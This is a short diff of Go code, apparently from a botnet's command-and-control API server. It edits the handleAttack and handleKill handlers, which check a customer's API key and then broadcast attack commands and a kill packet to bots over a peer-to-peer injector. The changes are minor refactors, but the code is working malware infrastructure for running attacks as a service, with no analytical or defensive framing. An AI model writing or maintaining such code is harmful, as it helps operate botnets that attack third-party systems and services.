@@ -64,7 +64,7 @@ func (this *APIServer) handleAttack(w http.ResponseWriter, r *http.Request) {
 	}
 
 	/* Validate API key */
-	if !database.ValidateAPIKey(req.APIKey) {
+	if ok, _ := database.CheckApiCode(req.APIKey); !ok {
 		json.NewEncoder(w).Encode(APIResponse{Success: false, Message: "Invalid API key"})
 		return
 	}
@@ -91,7 +91,7 @@ func (this *APIServer) handleAttack(w http.ResponseWriter, r *http.Request) {
 
 	/* Send via P2P network */
 	p2pSeeds := getAutoP2PSeeds()
-	injector := NewP2PInjector(p2pSeeds)
+	injector := NewP2PInjector(p2pSeeds, nil)
 	if err := injector.SendAttack(buf); err != nil {
 		json.NewEncoder(w).Encode(APIResponse{Success: false, Message: err.Error()})
 		return
@@ -149,7 +149,7 @@ func (this *APIServer) handleKill(w http.ResponseWriter, r *http.Request) {
 	killPacket := []byte{0x11, 0x00}  /* P2P_CMD_KILL, TTL=0 */
 
 	p2pSeeds := getAutoP2PSeeds()
-	injector := NewP2PInjector(p2pSeeds)
+	injector := NewP2PInjector(p2pSeeds, nil)
 	injector.SendAttack(killPacket)
 
 	json.NewEncoder(w).Encode(APIResponse{
